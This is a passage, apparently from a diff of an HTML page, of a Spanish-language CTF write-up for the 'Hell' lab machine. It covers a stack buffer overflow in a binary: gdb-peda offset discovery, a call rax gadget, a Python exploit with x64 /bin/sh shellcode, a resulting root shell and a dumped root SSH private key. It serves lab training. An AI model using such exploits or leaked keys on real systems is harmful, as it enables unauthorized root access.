+</span><span class="ve">R9</span><span class="p"> : 0x414b254135254166 ('fA%5A%KA')
+</span><span class="ve">R10</span><span class="p">: </span><span class="ve">0x7ffff7d96db8</span><span class="p"> --> 0xf001a00004252 
+</span><span class="ve">R11</span><span class="p">: </span><span class="ro">0x7ffff7f16010</span><span class="p"> (<__strcpy_ssse3>:	endbr64)
+</span><span class="ve">R12</span><span class="p">: </span><span class="az">0x7fffffffe3c8</span><span class="p"> --> 0x7fffffffe626 ("/opt/projects/strlen")
+</span><span class="ve">R13</span><span class="p">: </span><span class="ro">0x4011b6</span><span class="p"> (&ltmain>:	endbr64)
+</span><span class="ve">R14</span><span class="p">: </span><span class="az">0x403220</span><span class="p"> --> 0x401180 (<__do_global_dtors_aux>:	endbr64)
+</span><span class="ve">R15</span><span class="p">: </span><span class="az">0x7ffff7ffd040</span><span class="p"> --> 0x7ffff7ffe2e0 --> 0x0
+</span><span class="ve">EFLAGS</span><span class="p">: 0x10246 (</span><span class="ve">carry </span><span class="ro">PARITY </span><span class="ve">adjust </span><span class="ro">ZERO </span><span class="ve">sign trap </span><span class="ro">INTERRUPT </span><span class="ve">direction overflow</span><span class="p">)
+</span><span class="az">[-------------------------------------code-------------------------------------]</span><span class="p">
+   0x401290 &ltoverflow+110>:	</span><span class="ro">call   0x401080 &ltstrcpy@plt></span><span class="p">
+   0x401295 &ltoverflow+115>:	</span><span class="c1">nop</span><span class="p">
+   0x401296 &ltoverflow+116>:	</span><span class="c1">leave</span><span class="p">
+=> 0x401297 &ltoverflow+117>:	</span><span class="ve">ret</span><span class="p">
+   0x401298 <_fini>:	endbr64 
+   0x40129c <_fini+4>:	sub    rsp,0x8
+   0x4012a0 <_fini+8>:	add    rsp,0x8
+   0x4012a4 <_fini+12>:	</span><span class="az">ret
+[------------------------------------stack-------------------------------------]</span><span class="p">
+0000| </span><span class="az">0x7fffffffe298</span><span class="p"> ("HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0008| </span><span class="az">0x7fffffffe2a0</span><span class="p"> ("%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0016| </span><span class="az">0x7fffffffe2a8</span><span class="p"> ("A%JA%fA%5A%KA%gA%6A%")
+0024| </span><span class="az">0x7fffffffe2b0</span><span class="p"> ("5A%KA%gA%6A%")
+0032| </span><span class="az">0x7fffffffe2b8</span><span class="p"> --> 0x7f0025413625 
+0040| </span><span class="az">0x7fffffffe2c0</span><span class="p"> --> 0x0 
+0048| </span><span class="az">0x7fffffffe2c8</span><span class="p"> --> </span><span class="ro">0x4011b6</span><span class="p"> (&ltmain>:	endbr64)
+0056| </span><span class="az">0x7fffffffe2d0</span><span class="p"> --> 0x200000000 
+</span><span class="az">[------------------------------------------------------------------------------]</span><span class="p">
+Legend: </span><span class="ro">code</span><span class="p">, </span><span class="az">data</span><span class="p">, </span><span class="ve">rodata</span><span class="p">, value
+Stopped reason: </span><span class="ro">SIGSEGV
+</span><span class="az">0x0000000000401297 </span><span class="p">in </span><span class="am">overflow</span><span class="p"> ()
+</span><span class="ro">gdb-peda$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora buscamos el <code class="language-plaintext highlighter-rouge">offset</code> o bytes necesarios antes de sobreescribir el registro <code class="language-plaintext highlighter-rouge">RIP</code> que apuntara a la siguiente instrucción, para ello son necesarios <code class="language-plaintext highlighter-rouge">264</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">gdb-peda$ </span><span class="p">x/wx $rsp
+</span><span class="az">0x7fffffffe298</span><span class="p">:	0x64254148
+</span><span class="ro">gdb-peda$ </span><span class="p">pattern_offset 0x64254148  
+1680163144 found at offset: 264
+</span><span class="ro">gdb-peda$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos instrucciones en el programa que ejecuten un <code class="language-plaintext highlighter-rouge">jmp</code> o un <code class="language-plaintext highlighter-rouge">call</code> a un registro nos encontramos con <code class="language-plaintext highlighter-rouge">3</code> direcciones, cualquiera de estas nos serviria ya que apuntan al registro <code class="language-plaintext highlighter-rouge">rax</code> que es donde esta el inicio de nuestro <code class="language-plaintext highlighter-rouge">input</code> y lo interpreta</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">gdb-peda$ </span><span class="p">jmpcall
+0x401014 : call rax  
+0x40112c : jmp rax
+0x40116e : jmp rax
+</span><span class="ro">gdb-peda$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro payload sera el siguiente, iniciamos por un <a href="https://www.exploit-db.com/shellcodes/46907">shellcode</a> en x64 que ejecute una <code class="language-plaintext highlighter-rouge">/bin/sh</code>, despues rellenamos con <code class="language-plaintext highlighter-rouge">A's</code> hasta llegar al <code class="language-plaintext highlighter-rouge">RIP</code> y hacemos que este apunte a la direccion de la intrucción <code class="language-plaintext highlighter-rouge">call rax</code>, esta instruccion interpretara el registro <code class="language-plaintext highlighter-rouge">rax</code> donde esta el inicio de nuestro <code class="language-plaintext highlighter-rouge">input</code> y ejecutara nuestro <code class="language-plaintext highlighter-rouge">shellcode</code></p>
+<a href="/hmv/hell/15.png" target="_blank"><div><p><img src="/hmv/hell/15.png"></p></div></a>
+
+<p class="plain-text">Ahora definimos el plan anterior en un script de <code class="language-plaintext highlighter-rouge">python</code> simplemente convirtiendo la direccion de call rax <code class="language-plaintext highlighter-rouge">0x401014</code> a little endian que seria igual a <code class="language-plaintext highlighter-rouge">\x14\x10\x40</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python2
+</span><span class="p">
+offset </span><span class="o">= </span><span class="mi">264
+</span><span class="p">
+shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span class="s">"  
+</span><span class="p">
+junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">*</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(shellcode))
+
+callrax </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x14\x10\x40</span><span class="s">"</span><span class="p">
+
+payload </span><span class="o">= </span><span class="p">shellcode </span><span class="o">+ </span><span class="p">junk </span><span class="o">+ </span><span class="p">callrax
+
+</span><span class="no">print</span><span class="p">(payload)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente ejecutamos el programa pasandole el <code class="language-plaintext highlighter-rouge">payload</code> del script de python como argumento, al hacerlo se nos otorga una <code class="language-plaintext highlighter-rouge">/bin/sh</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">gato@hell</span><span class="p">:</span><span class="az">~</span><span class="p">$ /opt/projects/strlen $(python2 exploit.py)
+
+█▀ ▀█▀ █▀█ █   █▀▀ █▄ █
+▄█  █  █▀▄ █▄▄ ██▄ █ ▀█
+
+[</span><span class="az">*</span><span class="p">] String: H1�VH�/bin//shWT_j;X�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@  
+
+[</span><span class="ve">+</span><span class="p">] Length: 267
+
+# whoami
+root
+# hostname -I
+192.168.100.91 172.17.0.1 
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya como <code class="language-plaintext highlighter-rouge">root</code> podemos ejecutar cualquier comando, leemos la <code class="language-plaintext highlighter-rouge">id_rsa</code> de root</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p"># cat /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDmJr0/oCVLc+CIr0DLvX/Iekg3KCvx0kHWKMLoBfzERgAAAJDyk+/a8pPv
+2gAAAAtzc2gtZWQyNTUxOQAAACDmJr0/oCVLc+CIr0DLvX/Iekg3KCvx0kHWKMLoBfzERg
+AAAEB9iT+NoXyGbMDx8/m+91bIS5mGxdoy8fxw0Dm3IJ94luYmvT+gJUtz4IivQMu9f8h6  
+SDcoK/HSQdYowugF/MRGAAAACXJvb3RAaGVsbAECAwQ=
+-----END OPENSSH PRIVATE KEY-----
+#</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> usando la id_rsa y obtenemos una bash mas interactiva como el usuario <code class="language-plaintext highlighter-rouge">root</code>, finalmente podemos leer la ultima <code class="language-plaintext highlighter-rouge">flag</code> 11</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ssh </span><span class="p">root@192.168.100.91 -i id_rsa
+</span><span class="ve">root@hell</span><span class="p">:</span><span class="az">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="ve">root@hell</span><span class="p">:</span><span class="az">~</span><span class="p"># hostname -I
+192.168.100.91 172.17.0.1 
+</span><span class="ve">root@hell</span><span class="p">:</span><span class="az">~</span><span class="p"># cat flag.txt 
+
+█▀█ █▀█ █▀█ ▀█▀   █ █ █▀▀ █   █  
+█▀▄ █▄█ █▄█  █    █▀█ ██▄ █▄▄ █▄▄
+
+Flag 11: HELL{0V3RF10W_F0R_B3G1NN3R5}
+
+Congratulations on completing this CTF!
+
+- Do you want to tell me what you thought or if you would add/change anything?  
+- Do you want to support me by following me on the networks?
+- Have you found any unexpected route?
+
+Contact me through the following links:
+
+Github:    https://github.com/GatoGamer1155
+Twitter:   https://twitter.com/GatoGamer1155
+YouTube:   https://www.youtube.com/@GatoGamer1155
+Discord:   https://discord.com/users/866396648691597374
+Instagram: https://www.instagram.com/GatoGamer1155
+
+</span><span class="ve">root@hell</span><span class="p">:</span><span class="az">~</span><span class="p">#</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
